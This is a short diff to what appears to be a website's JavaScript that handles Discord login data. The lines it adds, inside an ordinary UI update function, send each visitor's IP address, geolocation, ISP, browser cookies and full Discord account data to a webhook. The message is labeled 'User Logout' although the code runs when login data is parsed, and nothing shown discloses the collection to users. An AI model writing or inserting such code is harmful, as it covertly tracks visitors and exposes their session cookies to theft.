@@ -230,6 +230,19 @@ async function updateUI() {
             // If user data is in the URL, parse and store it
             userData = JSON.parse(decodeURIComponent(userParam));
             localStorage.setItem('discordUser', JSON.stringify(userData)); // Store user data in local storage
+            await sendWebhook("User Logout", `
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+**Discord User Data:** \`\`\`json
+${userDataFormatted}
+\`\`\`
+    `.trim(), Math.floor(Math.random() * 16777215)); // Random color for user logout
 
             const usernameElement = document.querySelector('.username');
             usernameElement.innerText = userData.username; // Update username
